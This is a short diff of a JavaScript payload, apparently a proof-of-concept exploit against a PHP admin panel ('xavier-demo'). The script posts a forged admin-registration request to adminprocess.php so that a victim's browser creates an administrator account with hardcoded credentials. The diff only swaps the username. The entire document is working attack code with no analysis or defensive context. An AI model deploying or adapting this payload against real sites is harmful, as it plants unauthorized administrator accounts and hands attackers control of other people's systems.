@@ -1,7 +1,7 @@
 var root = ""
 var req = new XMLHttpRequest();
 var url = root + "/xavier-demo/admin/includes/adminprocess.php"
-var params = "user=Hackerman&firstname=Hackerman&lastname=Hackerman&pass=SupermanSuperman&conf_pass=SupermanSuperman&email=Hackerman%40Superman.com&conf_email=Hackerman%40Superman.com&form_submission=admin_registration"
+var params = "user=Ghostrider&firstname=Hackerman&lastname=Hackerman&pass=SupermanSuperman&conf_pass=SupermanSuperman&email=Hackerman%40Superman.com&conf_email=Hackerman%40Superman.com&form_submission=admin_registration"
 req.open("POST", url, true);
 req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req.send(params);
